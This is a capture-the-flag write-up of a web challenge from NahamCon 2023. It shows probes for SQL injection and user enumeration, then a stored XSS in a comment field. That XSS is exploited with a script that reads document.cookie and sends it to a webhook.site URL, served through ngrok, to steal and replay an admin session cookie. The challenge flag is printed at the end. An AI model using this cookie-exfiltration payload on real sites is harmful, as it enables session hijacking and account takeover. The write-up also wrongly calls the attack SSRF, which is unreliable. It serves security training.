# Star Wars

Link: [http://challenge.nahamcon.com:32040](http://challenge.nahamcon.com:32040/signin?error=Invalid%20session%20please%20sign%20in)

Date: 16/06/2023

![Untitled](Star%20Wars%20f8260a3e16f341258b2ea78fcd791367/Untitled.png)

Nothing interesting in the source code. I tried some sql injection first manually  `' or 1=1 -- -`  and using `sqlmap` . We can signup. In signup we can enumerate users: using admin:test

![Untitled](Star%20Wars%20f8260a3e16f341258b2ea78fcd791367/Untitled%201.png)

Ok it exists the user admin lets try to use some spaces or special chars: 

- `username=admin%0A&password=test&password2=test`
- `username=admin+&password=test&password2=test`
- `username=+admin&password=test&password2=test`

It does not work, it does not strip/trim the string.

Let’s understand what technologies are used: I get something that should return 404: `GET /test`

![Untitled](Star%20Wars%20f8260a3e16f341258b2ea78fcd791367/Untitled%202.png)

After a basic google search I found that this message is used by popular python framework `Flask.`

After signup and login:

![Untitled](Star%20Wars%20f8260a3e16f341258b2ea78fcd791367/Untitled%203.png)

Clicking on `Read More`

![Untitled](Star%20Wars%20f8260a3e16f341258b2ea78fcd791367/Untitled%204.png)

I can leave a comment, let’s try if it is vulnerable to `XSS`:

- `<script>alert(1)</script>`

It worked! It is vulnerable to XSS.

After I left the comment:

![Untitled](Star%20Wars%20f8260a3e16f341258b2ea78fcd791367/Untitled%205.png)

Let’s use a webhook to understand if it fetches it:

1. Get URL hook from `https://webhook.site`
2. Create a `js` file:
    
    ```powershell
    fetch('https://webhook.site/6c071a00-6bf2-4640-a96d-92ce3c888d6f?cookie=' + cookie, {mode: 'no-cors'})
      .then(response => {
        console.log('Request succeeded with HTTP response code', response.status);
      })
      .catch((error) => {
        console.error('Request failed', error);
      });
    ```
    
3. Serve this file using python+ngrok:
    
    ```powershell
    python -m http.server 6969
    ```
    
    ```powershell
    ngrok http 6969
    ```
    
4. I left this comment:
    
    ```powershell
    <script src="http://e0fa-101-56-73-87.ngrok-free.app"></script>
    ```
    
5. After submit I found that a get request is sent to the webhook with these headers:
    
    ![Untitled](Star%20Wars%20f8260a3e16f341258b2ea78fcd791367/Untitled%206.png)
    

The idea is to steal cookies and send them to the webhook so it is a `SSRF attack`.

Change the js file to:

```powershell
cookie = document.cookie;
fetch('https://webhook.site/6c071a00-6bf2-4640-a96d-92ce3c888d6f?cookie=' + cookie, {mode: 'no-cors'})
  .then(response => {
    console.log('Request succeeded with HTTP response code', response.status);
  })
  .catch((error) => {
    console.error('Request failed', error);
  });
```

And the webhook got this:

![Untitled](Star%20Wars%20f8260a3e16f341258b2ea78fcd791367/Untitled%207.png)

It is the **admin cookie** we can check unsigning it:

![Untitled](Star%20Wars%20f8260a3e16f341258b2ea78fcd791367/Untitled%208.png)

The **id** is **1** different from our previous one (it was 3):

Now let’s inject the cookie using `Application` module of **chrome dev tool:**

![Untitled](Star%20Wars%20f8260a3e16f341258b2ea78fcd791367/Untitled%209.png)

After refresh I had the admin button and the flag:

![Untitled](Star%20Wars%20f8260a3e16f341258b2ea78fcd791367/Untitled%2010.png)

Flag is `flag{a538c88890d45a382e44dfd00296a99b}`